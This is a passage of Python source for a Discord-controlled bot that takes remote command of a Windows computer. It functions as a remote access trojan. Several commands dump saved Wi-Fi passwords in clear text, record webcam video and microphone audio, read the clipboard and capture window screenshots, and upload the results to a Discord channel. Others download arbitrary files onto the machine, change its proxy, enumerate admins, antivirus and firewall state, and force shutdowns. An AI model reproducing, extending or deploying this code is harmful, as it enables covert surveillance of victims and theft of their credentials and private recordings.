        await ctx.send(embed=create_embed("🚀 Speedtest", f"The connection was measured with a latency of **{ping} ms**, **{dl} Mbps** down and **{ul} Mbps** up.", 0x0084ff))
    else:
        await ctx.send(embed=create_embed("Error", "The speedtest client is not available and could not be installed.", 0xff0000))


@bot.command(aliases=["alt-f4", "altf4"])
async def alt_f4(ctx):
    ps("$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('%{F4}')")
    await ctx.send(embed=create_embed("❌ Alt+F4", "The combination Alt+F4 was sent to the window in the foreground.", 0x0084ff))


@bot.command(aliases=["airplane-mode", "airplane"])
async def airplane_mode(ctx, state: str = None):
    if not state or state.lower() not in ["on", "off"]:
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`, for example `.airplane on`.", 0xffa500))
        return
    await ctx.message.add_reaction("✈️")
    if state.lower() == "on":
        ps("Disable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
    else:
        ps("Enable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
    await ctx.send(embed=create_embed("✈️ Airplane Mode", "Every network adapter was dropped." if state.lower() == "on" else "Every network adapter was brought back up.", 0x0084ff))


@bot.command(aliases=["mute"])
async def toggle_mute(ctx):
    ps("$w = New-Object -ComObject WScript.Shell; $w.SendKeys([char]173)")
    await ctx.send(embed=create_embed("🔇 Mute", "The mute state of the system was toggled.", 0x0084ff))


@bot.command(aliases=["show-screens", "screens"])
async def show_screens(ctx):
    await ctx.message.add_reaction("🖥️")
    ps_script = r'''
Add-Type -AssemblyName System.Windows.Forms
$s = [System.Windows.Forms.Screen]::AllScreens
$i = 1
$o = @()
foreach ($sc in $s) { $p = if ($sc.Primary) { " (Primary)" } else { "" }; $o += "$i. $($sc.DeviceName)$p - $($sc.Bounds.Width)x$($sc.Bounds.Height)"; $i++ }
$o -join "`n"
'''
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🖥️ Displays", f"These are the connected displays with their resolution:\n```{out or 'None detected'}```", 0x0084ff))


@bot.command(aliases=["screen-mode"])
async def screen_mode(ctx, mode: str = None):
    args = {"expand": "/extend", "duplicate": "/clone", "internal": "/internal", "external": "/external"}
    if not mode or mode.lower() not in args:
        await ctx.send(embed=create_embed("Error", "You have to pick one of these modes: `expand`, `duplicate`, `internal` or `external`.", 0xffa500))
        return
    subprocess.run(f"displayswitch.exe {args[mode.lower()]}", shell=True)
    await ctx.send(embed=create_embed("🖥️ Display Mode", f"The layout was switched to **{mode.lower()}**.", 0x0084ff))


@bot.command(aliases=["rotate-screen", "rotate"])
async def rotate_screen(ctx, degrees: int = None):
    if degrees not in (0, 90, 180, 270):
        await ctx.send(embed=create_embed("Error", "The angle has to be 0, 90, 180 or 270.", 0xffa500))
        return
    try:
        dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
        dm.DisplayOrientation = degrees // 90
        if degrees in (90, 270):
            dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
        win32api.ChangeDisplaySettings(dm, 0)
        await ctx.send(embed=create_embed("🖥️ Rotate", f"The screen was rotated {degrees} degrees.", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The rotation could not be applied: {e}", 0xff0000))


@bot.command(aliases=["lock-pc"])
async def lock_pc(ctx):
    ctypes.windll.user32.LockWorkStation()
    await ctx.send(embed=create_embed("🔒 Lock", "The workstation was locked and the credentials are now required.", 0x0084ff))


@bot.command(aliases=["sleep-pc"])
async def sleep_pc(ctx):
    subprocess.Popen("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
    await ctx.send(embed=create_embed("😴 Sleep", "The machine was sent to sleep, it will resume on the next input.", 0x0084ff))


@bot.command(aliases=["restart-pc"])
async def restart_pc(ctx):
    os.system("shutdown /r /f /t 0")
    await ctx.send(embed=create_embed("🔁 Restart", "The machine is restarting right now with no delay.", 0xff0000))


@bot.command(aliases=["shutdown-pc"])
async def shutdown_pc(ctx):
    os.system("shutdown /s /f /t 0")
    await ctx.send(embed=create_embed("⏻ Shutdown", "The machine is shutting down right now with no delay.", 0xff0000))

@bot.command()
async def say(ctx, *, text: str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(text)


@bot.command()
async def purge(ctx, amount: int = 20):
    amount = max(1, min(amount, 200))
    deleted = await ctx.channel.purge(limit=amount + 1)
    msg = await ctx.send(embed=create_embed("🧹 Purge", "**{}** messages were removed from this channel.".format(len(deleted) - 1), 0x00FF00))
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass


@bot.command()
async def nick(ctx, *, name: str = None):
    try:
        await ctx.guild.me.edit(nick=name)
        await ctx.send(embed=create_embed("🏷️ Nickname", "The bot nickname was set to `{}`.".format(name or "(default)"), 0x00FF00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The nickname could not be changed: {e}", 0xFF0000))


@bot.command()
async def avatar(ctx, url: str = None):
    if not url:
        await ctx.send(embed=create_embed("Error", "You have to give a direct URL to the image.", 0xFFA500))
        return
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=30)) as r:
                data = await r.read()
        await bot.user.edit(avatar=data)
        await ctx.send(embed=create_embed("🖼️ Avatar", "The bot avatar was replaced with the supplied image.", 0x00FF00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The avatar could not be updated: {e}", 0xFF0000))


@bot.command()
async def status(ctx, kind: str = "playing", *, text: str = None):
    kinds = {"playing": discord.ActivityType.playing, "watching": discord.ActivityType.watching,
             "listening": discord.ActivityType.listening, "competing": discord.ActivityType.competing}
    if kind.lower() not in kinds or not text:
        await ctx.send(embed=create_embed("Error", "You have to give an activity type and a text, for example `.status watching you`.", 0xFFA500))
        return
    await bot.change_presence(activity=discord.Activity(type=kinds[kind.lower()], name=text))
    await ctx.send(embed=create_embed("🎭 Status", "The bot presence is now `{} {}`.".format(kind.lower(), text), 0x00FF00))


@bot.command()
async def embed(ctx, *, raw: str = None):
    if not raw or "|" not in raw:
        await ctx.send(embed=create_embed("Error", "The text has to be a title, a pipe and a description.", 0xFFA500))
        return
    title, description = raw.split("|", 1)
    title, description = title.strip(), description.strip()
    if not title or not description:
        await ctx.send(embed=create_embed("Error", "Both the title and the description are required.", 0xFFA500))
        return
    await ctx.send(embed=create_embed(title[:256], description[:4000]))


@bot.command(aliases=["servers"])
async def guilds(ctx):
    lines = ["{}  ·  `{}`  ·  {} members".format(g.name, g.id, g.member_count) for g in bot.guilds]
    await send_long(ctx, "\n".join(lines) or "The bot is not in any server.")


@bot.command(aliases=["latency"])
async def pingbot(ctx):
    await ctx.send(embed=create_embed("📡 Latency", "The gateway answers with a delay of **{:.0f} ms**.".format(bot.latency * 1000), 0x0084FF))


@bot.command(aliases=["ss-window"])
async def screenshot_window(ctx, *, title: str):
    await ctx.message.add_reaction("📌")

    def grab():
        found = []

        def cb(hwnd, _):
            if win32gui.IsWindowVisible(hwnd) and title.lower() in win32gui.GetWindowText(hwnd).lower():
                found.append(hwnd)
            return True

        win32gui.EnumWindows(cb, None)
        if not found:
            return None
        hwnd = found[0]
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetForegroundWindow(hwnd)
        except Exception:
            pass
        time.sleep(0.35)
        rect = win32gui.GetWindowRect(hwnd)
        if rect[2] - rect[0] < 8 or rect[3] - rect[1] < 8:
            return None
        img = ImageGrab.grab(bbox=rect, all_screens=True)
        path = os.path.join(BASE_DIR, "sswin.png")
        img.save(path)
        return path

    path = await asyncio.to_thread(grab)
    if not path:
        await ctx.send(embed=create_embed("Error", "No visible window matched `{}`.".format(title), 0xFF0000))
        return
    embed = create_embed("📸 Window", "The window `{}` was brought to the front and captured, the image is attached below.".format(title), 0x0084FF)
    embed.set_image(url="attachment://sswin.png")
    await ctx.send(embed=embed, file=discord.File(path, filename="sswin.png"))
    try:
        os.remove(path)
    except Exception:
        pass


@bot.command(aliases=["autorun"])
async def autoruns(ctx):
    lines = []
    for hive, path in (("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"),
                       ("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                       ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run")):
        out = cmd_run('reg query "{}\\{}" 2>nul'.format(hive, path)).stdout or ""
        for line in out.splitlines():
            if "REG_SZ" in line or "REG_EXPAND_SZ" in line:
                lines.append("[{}] {}".format(hive, line.strip()))
    for folder in (_startup_dir(), os.path.join(os.environ.get("ProgramData", ""),
                                                r"Microsoft\Windows\Start Menu\Programs\StartUp")):
        try:
            for f in os.listdir(folder):
                lines.append("[startup] {}".format(f))
        except Exception:
            pass
    await send_long(ctx, "\n".join(lines) or "Nothing is set to start automatically.")


@bot.command(aliases=["tasks"])
async def scheduled_tasks(ctx):
    await send_long(ctx, (cmd_run("schtasks /query /fo table /nh").stdout or "")[:7000])


@bot.command()
async def printers(ctx):
    await send_long(ctx, _run_ps("Get-Printer | Select-Object Name, DriverName, PortName | Format-Table -AutoSize | Out-String") or "No printers are installed.")


@bot.command(aliases=["av-status"])
async def defender_status(ctx):
    await send_long(ctx, _run_ps("Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, "
                                 "AntivirusSignatureVersion, QuickScanEndTime | Format-List | Out-String") or "No data was returned.")


@bot.command()
async def firewall_rules(ctx):
    await send_long(ctx, _run_ps("Get-NetFirewallRule -Enabled True | Select-Object -First 60 DisplayName, "
                                 "Direction, Action | Format-Table -AutoSize | Out-String") or "No data was returned.")


@bot.command()
async def rdp(ctx):
    out = _run_ps(r"(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections")
    if not out:
        await ctx.send(embed=create_embed("🖥️ RDP", "The remote desktop state could not be read.", 0x0084FF))
        return
    await ctx.send(embed=create_embed("🖥️ RDP", "Remote desktop is enabled on this machine." if out == "0" else "Remote desktop is disabled on this machine.", 0x0084FF))


@bot.command(aliases=["admins"])
async def local_admins(ctx):
    await send_long(ctx, cmd_run("net localgroup administrators").stdout)


@bot.command()
async def power_plan(ctx, plan: str = None):
    plans = {"high": "SCHEME_MIN", "balanced": "SCHEME_BALANCED", "saver": "SCHEME_MAX"}
    if plan not in plans:
        await ctx.send(embed=create_embed("Error", "You have to pick `high`, `balanced` or `saver`.", 0xFFA500))
        return
    subprocess.run(["powercfg", "/setactive", plans[plan]], capture_output=True, creationflags=_CNW)
    await ctx.send(embed=create_embed("🔌 Power plan", f"The active power plan is now **{plan}**.", 0x00FF00))


@bot.command()
async def timezone(ctx, *, tz: str = None):
    if not tz:
        await ctx.send(embed=create_embed("🕒 Timezone", "The current timezone of the machine is `{}`.".format((cmd_run("tzutil /g").stdout or "").strip() or "Unknown"), 0x0084FF))
        return
    subprocess.run(["tzutil", "/s", tz], capture_output=True, creationflags=_CNW)
    await ctx.send(embed=create_embed("🕒 Timezone", f"The timezone was changed to `{tz}`.", 0x00FF00))


@bot.command()
async def proxy(ctx, state: str = None, *, server: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`, optionally followed by a host and port.", 0xFFA500))
        return
    key = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
    if state == "on" and server:
        cmd_run('reg add "HKCU\\{}" /v ProxyServer /t REG_SZ /d {} /f'.format(key, server))
        cmd_run('reg add "HKCU\\{}" /v ProxyEnable /t REG_DWORD /d 1 /f'.format(key))
        await ctx.send(embed=create_embed("🌐 Proxy", f"The system proxy is now enabled and points to `{server}`.", 0x00FF00))
    else:
        cmd_run('reg add "HKCU\\{}" /v ProxyEnable /t REG_DWORD /d 0 /f'.format(key))
        await ctx.send(embed=create_embed("🌐 Proxy", "The system proxy was disabled.", 0x00FF00))


@bot.command()
async def tail(ctx, file: str, lines: int = 20):
    try:
        with builtins.open(resolve(file), "r", encoding="utf-8", errors="replace") as f:
            data = f.readlines()[-max(1, min(lines, 500)):]
        await send_long(ctx, "".join(data) or "(The file is empty)")
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The file could not be read: {e}", 0xFF0000))


_SKIP_DIRS = {"AppData", "node_modules", ".git", "__pycache__", "venv", ".venv",
              "Windows", "Program Files", "Program Files (x86)"}


def _walk(root, max_dirs=4000):
    seen = 0
    for dp, dirs, fs in os.walk(root):
        dirs[:] = [d for d in dirs if d not in _SKIP_DIRS or dp == root]
        seen += 1
        yield dp, fs
        if seen >= max_dirs:
            return


@bot.command()
async def grep(ctx, pattern: str, *, path: str = None):
    root = resolve(path or current_dir)
    hits = []
    for dp, fs in _walk(root):
        for f in fs:
            full = os.path.join(dp, f)
            try:
                if os.path.getsize(full) > 8 * 1024 * 1024:
                    continue
                with builtins.open(full, "r", encoding="utf-8", errors="ignore") as fh:
                    for i, line in enumerate(fh, 1):
                        if pattern.lower() in line.lower():
                            hits.append("{}:{}: {}".format(full, i, line.strip()[:160]))
                            break
            except Exception:
                pass
            if len(hits) >= 60:
                break
        if len(hits) >= 60:
            break
    await send_long(ctx, "\n".join(hits) or "No file contained that text.")


@bot.command()
async def touch(ctx, *, file: str):
    p = resolve(file)
    try:
        with builtins.open(p, "a"):
            pass
        os.utime(p, None)
        await ctx.send(embed=create_embed("🆕 Touch", f"`{p}` was created if it did not exist and its date was refreshed.", 0x00FF00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The file could not be touched: {e}", 0xFF0000))


@bot.command(aliases=["biggest"])
async def large_files(ctx, *, path: str = None):
    root = resolve(path or current_dir)
    found = []
    for dp, fs in _walk(root):
        for f in fs:
            try:
                full = os.path.join(dp, f)
                found.append((os.path.getsize(full), full))
            except Exception:
                pass
    found.sort(reverse=True)
    await send_long(ctx, "\n".join("{:.1f} MB  {}".format(s / 1048576, p) for s, p in found[:40]) or "No files were found.")

@bot.command()
async def sysinfo(ctx):
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        e = create_embed("🖥️ System Info", "Live load of the machine, sampled over half a second.", 0x3498db)
        e.add_field(name="Host", value=socket.gethostname(), inline=True)
        e.add_field(name="OS", value=f"{__import__('platform').system()} {__import__('platform').release()}", inline=True)
        e.add_field(name="User", value=os.getlogin(), inline=True)
        e.add_field(name="CPU", value=f"{cpu}%", inline=True)
        e.add_field(name="RAM", value=f"{ram.percent}% ({ram.used // 1e6:.0f}/{ram.total // 1e6:.0f} MB)", inline=True)
        e.add_field(name="Disk", value=f"{disk.percent}% used", inline=True)
        e.add_field(name="Boot", value=boot, inline=False)
        await ctx.send(embed=e)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The system information could not be collected: {e}", 0xff0000))


@bot.command()
async def battery(ctx):
    try:
        b = psutil.sensors_battery()
        if not b:
            await ctx.send(embed=create_embed("🔋 Battery", "This machine has no battery, it is a desktop.", 0x3498db))
            return
        state = "charging" if b.power_plugged else "discharging"
        await ctx.send(embed=create_embed("🔋 Battery", f"The battery is at **{b.percent}%** and it is {state}.", 0x00ff00 if b.power_plugged else 0xffa500))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The battery state could not be read: {e}", 0xff0000))

def _wifi_export():
    tmp = tempfile.mkdtemp(prefix="wf_")
    found = []
    try:
        cmd_run('netsh wlan export profile folder="{}" key=clear'.format(tmp))
        for fn in os.listdir(tmp):
            if not fn.lower().endswith(".xml"):
                continue
            txt = ""
            try:
                with builtins.open(os.path.join(tmp, fn), "r", encoding="utf-8", errors="replace") as f:
                    txt = f.read()
            except Exception:
                continue
            ssid = re.search(r"<name>(.*?)</name>", txt, re.S)
            key = re.search(r"<keyMaterial>(.*?)</keyMaterial>", txt, re.S)
            if ssid:
                found.append((ssid.group(1).strip(), key.group(1).strip() if key else "(open)"))
    except Exception:
        pass
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return found


def _wifi_parse():
    found = []
    out = cmd_run("netsh wlan show profiles").stdout or ""
    names = []
    for line in out.splitlines():
        if ":" in line:
            candidate = line.split(":", 1)[1].strip()
            if candidate and candidate.lower() not in ("", "name"):
                names.append(candidate)
    for p in dict.fromkeys(names):
        r = cmd_run('netsh wlan show profile name="{}" key=clear'.format(p)).stdout or ""
        key = ""
        for line in r.splitlines():
            if ":" in line:
                head, tail = line.split(":", 1)
                h = head.lower()
                if "key content" in h or "contenido de la clave" in h:
                    key = tail.strip()
        found.append((p, key or "(open)"))
    return found


@bot.command(aliases=["wifi-passwords"])
async def wifi(ctx):
    await ctx.message.add_reaction("📶")
    try:
        found = await asyncio.to_thread(_wifi_export)
        if not found:
            found = await asyncio.to_thread(_wifi_parse)
        if not found:
            await ctx.send(embed=create_embed("📶 WiFi", "No saved wireless profile was found on this machine.", 0xFF0000))
            return
        lines = ["{} : {}".format(s, k) for s, k in found]
        await _send_text_files(ctx.channel, "wifi_{}".format(int(time.time())), "\n".join(lines))
        await ctx.send(embed=create_embed("📶 WiFi", "**{}** saved profiles were dumped with their keys and are attached below.".format(len(found)), 0x0084FF))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The wireless profiles could not be read: {e}", 0xFF0000))

@bot.command(aliases=["camrec", "webcam-rec", "record-cam"])
async def cam_rec(ctx, seconds: int = 10):
    seconds = max(1, min(seconds, 120))
    await ctx.message.add_reaction("📹")

    def record():
        cap = cv2.VideoCapture(selected_camera)
        if not cap.isOpened():
            return None
        w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)) or 640
        h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)) or 480
        fps = 15
        path = os.path.join(BASE_DIR, "cam_{}.mp4".format(int(time.time())))
        writer = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*"mp4v"), fps, (w, h))
        end = time.time() + seconds
        while time.time() < end:
            ok, frame = cap.read()
            if not ok:
                break
            writer.write(frame)
        writer.release()
        cap.release()
        return path if os.path.exists(path) and os.path.getsize(path) > 1000 else None

    path = await asyncio.to_thread(record)
    if not path:
        await ctx.send(embed=create_embed("Error", "Camera {} could not be opened for recording.".format(selected_camera), 0xFF0000))
        return

    fixed = path[:-4] + "_h.mp4"
    try:
        await asyncio.to_thread(lambda: subprocess.run(
            [FFMPEG_BIN, "-y", "-i", path, "-c:v", "libx264", "-preset", "veryfast",
             "-pix_fmt", "yuv420p", "-movflags", "+faststart", fixed],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=240))
        if os.path.exists(fixed) and os.path.getsize(fixed) > 1000:
            os.remove(path)
            path = fixed
    except Exception:
        pass

    try:
        await ctx.send(embed=create_embed("📹 Camera", "A **{}** second clip was recorded with camera **{}** and is attached below.".format(seconds, selected_camera), 0x0084FF),
                       file=discord.File(path, filename="cam.mp4"))
    finally:
        try:
            os.remove(path)
        except Exception:
            pass

@bot.command(aliases=["unpin-all", "unpin-taskbar"])
async def despin_all(ctx):
    folder = os.path.join(os.environ.get("APPDATA", ""),
                          r"Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar")
    removed = 0
    if os.path.isdir(folder):
        for f in os.listdir(folder):
            if f.lower().endswith(".lnk"):
                try:
                    os.remove(os.path.join(folder, f))
                    removed += 1
                except Exception:
                    pass
    _reg_delete(r"Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband", "Favorites", "HKCU")
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=_CNW)
    time.sleep(1)
    subprocess.Popen(["explorer.exe"], creationflags=_CNW)
    await ctx.send(embed=create_embed("📌 Taskbar", "{} shortcuts were unpinned and Explorer was restarted to apply it.".format(removed), 0x0084FF))


@bot.command(aliases=["restart-taskbar", "restart-explorer"])
async def restart_taskbar(ctx):
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=_CNW)
    time.sleep(1)
    subprocess.Popen(["explorer.exe"], creationflags=_CNW)
    await ctx.send(embed=create_embed("🪟 Explorer", "Explorer was restarted and the desktop was reloaded.", 0x00FF00))

@bot.command(aliases=["proc-info", "pinfo"])
async def proc_details(ctx, *, name: str):
    await ctx.message.add_reaction("🔍")
    rows = []
    for p in psutil.process_iter(["pid", "name", "exe", "username", "memory_info", "create_time"]):
        try:
            if name.lower() in (p.info.get("name") or "").lower():
                mem = getattr(p.info.get("memory_info"), "rss", 0) // 1048576
                rows.append("pid={} name={}\n  path={}\n  user={}\n  rss={}MB".format(
                    p.info["pid"], p.info.get("name"), p.info.get("exe") or "-",
                    p.info.get("username") or "-", mem))
        except Exception:
            pass
        if len(rows) >= 15:
            break
    await send_long(ctx, "\n".join(rows) or "No process matched that name.")


@bot.command(aliases=["ktree"])
async def kill_tree(ctx, *, name: str):
    killed = 0
    for p in psutil.process_iter(["name"]):
        try:
            if name.lower() in (p.info.get("name") or "").lower():
                for child in p.children(recursive=True):
                    try:
                        child.kill()
                        killed += 1
                    except Exception:
                        pass
                p.kill()
                killed += 1
        except Exception:
            pass
    await ctx.send(embed=create_embed("🪓 Kill tree", "{} processes were terminated, children included.".format(killed), 0xFF0000))


@bot.command(aliases=["vol-step"])
async def volume_step(ctx, direction: str = "up", times: int = 5):
    vk = 0xAF if direction.lower() == "up" else 0xAE
    times = max(1, min(times, 50))

    def press():
        for _ in range(times):
            ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
            ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
            time.sleep(0.04)

    await asyncio.to_thread(press)
    await ctx.send(embed=create_embed("🔊 Volume", "The volume was moved {} by {} steps.".format(direction.upper(), times), 0x00FF00))


@bot.command(aliases=["empty-temp", "clean-temp"])
async def empty_temp(ctx):
    removed = failed = 0
    meipass = os.path.abspath(getattr(sys, "_MEIPASS", "") or "")
    runtime = os.path.dirname(meipass) if meipass else ""
    for root in {tempfile.gettempdir(), os.path.join(WINDIR, "Temp")}:
        if not os.path.isdir(root):
            continue
        for entry in os.listdir(root):
            p = os.path.join(root, entry)
            if meipass and os.path.abspath(p) in (meipass, runtime):
                continue
            try:
                shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
                removed += 1
            except Exception:
                failed += 1
    await ctx.send(embed=create_embed("🧹 Temp", "**{}** entries were deleted from the temporary folders and **{}** could not be removed.".format(removed, failed), 0x00FF00))


@bot.command()
async def hosts(ctx):
    path = os.path.join(WINDIR, "System32", "drivers", "etc", "hosts")
    try:
        with builtins.open(path, "r", encoding="utf-8", errors="replace") as f:
            await send_long(ctx, f.read()[:8000] or "(The hosts file is empty)")
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The hosts file could not be read: {e}", 0xFF0000))



@bot.command()
async def drives(ctx):
    lines = []
    for part in psutil.disk_partitions():
        try:
            u = psutil.disk_usage(part.mountpoint)
            lines.append(f"{part.device} {part.fstype} {u.used // 1e9:.1f}/{u.total // 1e9:.1f} GB")
        except Exception:
            lines.append(part.device)
    await ctx.send(embed=create_embed("💽 Drives", f"The mounted volumes and their usage are listed below.\n```{chr(10).join(lines)}```", 0x3498db))




@bot.command()
async def startup(ctx):
    out = ps("Get-CimInstance Win32_StartupCommand | Select-Object Name, Command | Format-Table -AutoSize | Out-String").stdout
    await ctx.send(embed=create_embed("🚀 Startup", f"These entries run when the machine starts.\n```{out[-1900:]}```", 0x3498db))


@bot.command(aliases=["window-list", "windows"])
async def window_list(ctx):
    titles = enum_windows()
    await ctx.send(embed=create_embed("🪟 Open Windows", f"The following visible windows were found.\n```{chr(10).join(titles[:40])}```", 0x3498db))


@bot.command()
async def focus(ctx, *, title: str):
    def cb(hwnd, _):
        if title.lower() in win32gui.GetWindowText(hwnd).lower():
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetForegroundWindow(hwnd)
            return False
        return True
    win32gui.EnumWindows(cb, None)
    await ctx.send(embed=create_embed("🪟 Focus", f"The window matching `{title}` was restored and brought to the front.", 0x00ff00))


@bot.command(aliases=["close-window"])
async def close_window(ctx, *, title: str):
    def cb(hwnd, _):
        if title.lower() in win32gui.GetWindowText(hwnd).lower():
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        return True
    win32gui.EnumWindows(cb, None)
    await ctx.send(embed=create_embed("🪟 Close", f"A close request was sent to every window matching `{title}`.", 0xff0000))


@bot.command(aliases=["clip"])
async def clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        await ctx.send(embed=create_embed("📋 Clipboard", f"This is what the clipboard currently holds.\n```{data[:1900]}```", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The clipboard is empty or holds something that is not text: {e}", 0xff0000))


@bot.command(aliases=["set-clipboard"])
async def set_clipboard(ctx, *, text: str):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        await ctx.send(embed=create_embed("📋 Clipboard", "The clipboard content was replaced with the supplied text.", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The clipboard could not be overwritten: {e}", 0xff0000))


@bot.command()
async def beep(ctx):
    winsound.Beep(1000, 500)
    await ctx.send(embed=create_embed("🔔 Beep", "A 1000 Hz beep was played for half a second.", 0x00ff00))


@bot.command()
async def notepad(ctx, *, text: str = None):
    if text:
        path = os.path.join(BASE_DIR, "note.txt")
        with builtins.open(path, "w", encoding="utf-8") as f:
            f.write(text)
        subprocess.Popen(["notepad.exe", path])
    else:
        subprocess.Popen(["notepad.exe"])
    await ctx.send(embed=create_embed("📝 Notepad", "Notepad was opened." if not text else "Notepad was opened with the supplied text already loaded.", 0x00ff00))


@bot.command()
async def screensaver(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF140, 0)
    await ctx.send(embed=create_embed("🖼️ Screensaver", "The configured screensaver was started.", 0x00ff00))


@bot.command()
async def taskbar(ctx, state: str = None):
    if state not in ("hide", "show"):
        await ctx.send(embed=create_embed("Error", "You have to say `hide` or `show`.", 0xffa500))
        return
    hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
    await ctx.send(embed=create_embed("🪟 Taskbar", "The taskbar was hidden." if state == "hide" else "The taskbar is visible again.", 0x0084ff))


@bot.command(aliases=["desktop-icons"])
async def desktop_icons(ctx, state: str = None):
    if state not in ("hide", "show"):
        await ctx.send(embed=create_embed("Error", "You have to say `hide` or `show`.", 0xffa500))
        return
    progman = win32gui.FindWindow("Progman", None)
    shell = win32gui.FindWindowEx(progman, 0, "SHELLDLL_DefView", None)
    if shell:
        win32gui.ShowWindow(shell, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
    await ctx.send(embed=create_embed("🖥️ Desktop Icons", "The desktop icons were hidden." if state == "hide" else "The desktop icons are visible again.", 0x0084ff))


@bot.command(aliases=["mic-record"])
async def mic_record(ctx, seconds: int = 5):
    await ctx.message.add_reaction("🎙️")
    try:
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype=np.int16, device=selected_mic)
        sd.wait()
        path = os.path.join(BASE_DIR, "mic_rec.wav")
        with wave.open(path, "wb") as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(rec.tobytes())
        await ctx.send(embed=create_embed("🎙️ Recording", "A **{}** second clip from the selected microphone is attached below.".format(seconds), 0x0084ff), file=discord.File(path))
        os.remove(path)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The microphone could not be recorded: {e}", 0xff0000))


@bot.command(aliases=["grab-url", "wget", "download-url"])
async def grab_url(ctx, url: str, *, dest: str = None):
    global current_dir
    try:
        name = dest or url.split("/")[-1] or "file.bin"
        path = os.path.join(current_dir, name) if not os.path.isabs(name) else name
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                with builtins.open(path, "wb") as f:
                    f.write(await resp.read())
        await ctx.send(embed=create_embed("📥 Downloaded", f"`{name}` was downloaded straight into `{current_dir}`.", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The download failed: {e}", 0xff0000))


@bot.command(aliases=["installed", "installed-apps"])
async def installed_apps(ctx):
    apps = []
    for root in (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                 r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"):
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, root)
            for i in range(winreg.QueryInfoKey(k)[0]):
                try:
                    sub = winreg.OpenKey(k, winreg.EnumKey(k, i))
                    name = winreg.QueryValueEx(sub, "DisplayName")[0]
                    apps.append(name)
                except Exception:
                    pass
        except Exception:
            pass
    await ctx.send(embed=create_embed("📦 Installed Apps", f"These programs are registered as installed.\n```{chr(10).join(sorted(set(apps))[:60])}```", 0x3498db))


@bot.command()
async def services(ctx):
    out = ps("Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 60 Name, DisplayName | Format-Table -AutoSize | Out-String").stdout
    await ctx.send(embed=create_embed("⚙️ Services", f"These services are currently running.\n```{out[-1900:]}```", 0x3498db))


async def _send_text_files(channel, base, text):
    safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", base).strip("_")[:40] or "dump"
    data = (text or "(Empty)").encode("utf-8", "replace")
    limit = 8 * 1024 * 1024
    parts = [data[i:i + limit] for i in range(0, len(data), limit)] or [b""]
